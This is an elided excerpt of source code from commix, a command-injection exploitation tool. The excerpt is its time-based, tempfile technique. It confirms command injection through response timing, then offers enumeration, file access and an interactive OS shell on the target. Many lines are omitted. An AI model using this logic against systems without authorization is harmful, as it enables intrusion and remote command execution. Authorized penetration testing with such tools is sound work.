...
def delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url,
                ...
                for separator in settings.SEPARATORS:
                    ...
                    if settings.LOAD_SESSION:
                        ...
                        for output_length in range(1, int(tag_length)):
                            try:
                                ...
                                if alter_shell:
                                    payload = tfb_payloads.decision_alter_shell(separator, output_length, TAG,
                                                                                OUTPUT_TEXTFILE, timesec,
                                                                                http_request_method)
                                else:
                                    payload = tfb_payloads.decision(separator, output_length, TAG, OUTPUT_TEXTFILE,
                                ...
                                # Custom HTTP header injection
                                    ...
                                    how_long, vuln_parameter = tfb_injector.injection_test(payload, http_request_method,
                                                                                           url)
                                ...
                                if percent == 100 and no_result == True:
                                    ...
                                    if (url_time_response == 0 and (how_long - timesec) >= 0) or \
                                            (url_time_response != 0 and (how_long - timesec) == 0 and (
                                                    how_long == timesec)) or \
                                            (url_time_response != 0 and (how_long - timesec) > 0 and (
                                                    how_long >= timesec + 1)):
                                        ...
                                        if len(TAG) == output_length:
                                            ...
                                            if len(set(how_long_statistic[0:5])) == 1:
                                                if max(xrange(len(how_long_statistic)),
                                                       key=lambda x: how_long_statistic[x]) == len(TAG) - 1:
                                        ...
                                        if false_positive_warning:
                                            ...
                                            while True:
                                                if not menu.options.batch:
                                                    ...
                                                    proceed_option = input(settings.print_question_msg(question_msg))
                                                else:
                                                    proceed_option = ""
                                        ...
                                        if false_positive_fixation:
                                            ...
                                            if settings.TARGET_OS == "win":
                                                if alter_shell:
                                                    cmd = settings.WIN_PYTHON_DIR + " -c \"print (" + str(
                                                        randv1) + " + " + str(randv2) + ")\""
                                                else:
                                            ...
                                            how_long, output = tfb_injector.false_positive_check(separator, TAG, cmd,
                                                                                                 prefix, suffix,
                                                                                                 whitespace, timesec,
                                                                                                 http_request_method,
                                                                                                 url, vuln_parameter,
                                                                                                 OUTPUT_TEXTFILE,
                                                                                                 randvcalc, alter_shell,
                                                                                                 how_long,
                                                                                                 url_time_response)
                                ...
                                if 'cmd' in locals():
                                    ...
                                    delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace,
                    ...
                    if (url_time_response == 0 and (how_long - timesec) >= 0) or \
                        ...
                        if (len(TAG) == output_length) and \
                                (possibly_vulnerable == True or settings.LOAD_SESSION and int(
                            ...
                            if export_injection_info == False:
                                export_injection_info = logs.add_type_and_technique(export_injection_info, filename,
                                                                                    injection_type, technique)
                            if vp_flag == True:
                                vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name,
                            ...
                            info_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[
                            ...
                            if not settings.LOAD_SESSION:
                                shell = ""
                                session_handler.injection_point_importation(url, technique, injection_type, separator,
                                                                            shell, vuln_parameter, prefix, suffix, TAG,
                                                                            alter_shell, payload, http_request_method,
                                                                            url_time_response, timesec,
                                                                            original_how_long, output_length,
                                                                            is_vulnerable=menu.options.level)
                                # possibly_vulnerable = False
                            else:
                            ...
                            if settings.ENUMERATION_DONE == True:
                                while True:
                                    ...
                                    if enumerate_again in settings.CHOICE_YES:
                                        tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix,
                                ...
                                if menu.enumeration_options():
                                    tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace,
                            ...
                            if settings.FILE_ACCESS_DONE == True:
                                ...
                                while True:
                                    if not menu.options.batch:
                                        ...
                                        file_access_again = input(settings.print_question_msg(question_msg))
                                    else:
                                        file_access_again = ""
                                    if len(file_access_again) == 0:
                                        file_access_again = "Y"
                                    if file_access_again in settings.CHOICE_YES:
                                        tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix,
                                                                 whitespace, timesec, http_request_method, url,
                                                                 vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename,
                                                                 url_time_response)
                                        break
                                ...
                                #   print(settings.SINGLE_WHITESPACE)
                                tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace,
                                                         timesec, http_request_method, url, vuln_parameter,
                                                         OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)

                            # Check if defined single cmd.
                            if menu.options.os_cmd:
                                check_how_long, output = tfb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd,
                            ...
                            try:
                                ...
                                while True:
                                    ...
                                    if not menu.options.batch:
                                        ...
                                        gotshell = input(settings.print_question_msg(question_msg))
                                    else:
                                        gotshell = ""
                                    if len(gotshell) == 0:
                                        gotshell = "Y"
                                    if gotshell in settings.CHOICE_YES:
                                        ...
                                        while True:
                                            ...
                                            cmd = input(
                                                """commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                                            cmd = checks.escaped_cmd(cmd)
                                            if cmd.lower() in settings.SHELL_OPTIONS:
                                                go_back, go_back_again = shell_options.check_option(separator, TAG, cmd,
                                                                                                    prefix, suffix,
                                                                                                    whitespace,
                                                                                                    http_request_method,
                                                                                                    url, vuln_parameter,
                                            ...
                                            if menu.options.ignore_session or \
                                                ...
                                                check_how_long, output = tfb_injector.injection(separator, maxlen, TAG,
                                                                                                ...
                                                                                                url_time_response)
                                                # Export injection result
                                                tfb_injector.export_injection_results(cmd, separator, output,
                                                                                      check_how_long)
                                        ...
                                        if checks.next_attack_vector(technique, go_back) == True:
                                            ...
                                            if no_result == True:
                                                ...
                                                # Delete previous shell (text) files (output) from temp.
                                                delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix,
